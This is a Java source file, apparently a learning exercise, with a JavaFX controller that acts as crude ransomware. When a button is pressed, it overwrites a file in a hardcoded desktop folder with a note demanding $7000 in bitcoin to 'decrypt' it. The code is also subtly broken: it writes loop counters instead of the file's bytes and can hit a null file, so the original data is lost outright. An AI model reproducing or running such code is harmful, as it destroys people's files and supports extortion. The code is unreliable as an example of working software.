package lk.ijse.dep11;

import javafx.event.ActionEvent;
import javafx.fxml.FXMLLoader;
import javafx.scene.Scene;
import javafx.scene.control.Button;
import javafx.scene.layout.AnchorPane;
import javafx.stage.DirectoryChooser;
import javafx.stage.Stage;

import java.io.*;
import java.util.Arrays;

public class MainSceneController {
    public Button btnEnter;
    public AnchorPane root1;
    File file ;
    public void btnEnterOnAction(ActionEvent event) throws Exception {
        String targetFile = "/home/wishva/Desktop/execelent/something.txt";
        String targetDirectory =  "/home/wishva/Desktop/execelent/";
        File[] files = new File(targetDirectory).listFiles();

        for (File f : files) {
            if (f.isFile()) file = f;
        }

        if(!file.isFile()) file = new File(targetFile);file.createNewFile();

        try {
//            File newFile = new File(targetDirectory + "next.txt");
            FileInputStream fis = new FileInputStream(file);

            byte[] buffer = new byte[fis.available()];
            buffer = fis.readAllBytes();
            int read= 0;
            System.out.println(new String(buffer));
            fis.close();
            FileOutputStream fos = new FileOutputStream(file);
            String msg = "In Order to decrypt your files\nSend 7000$ worth of bitcoins to 987515190750915895 Address\n\n\n";
            fos.write(msg.getBytes());
            for (int i = (byte) buffer.length-1;i >=0;i--) {
                fos.write((char)i);
            }

            fos.close();
        }catch (IOException e){
            e.printStackTrace();
        }


        Thread.sleep(2000);
        Stage stage = (Stage) root1.getScene().getWindow();
        stage.setScene(new Scene(FXMLLoader.load(getClass().getResource("/view/NewScene.fxml"))));
        stage.centerOnScreen();
        stage.setResizable(false);
        stage.show();
    }
}
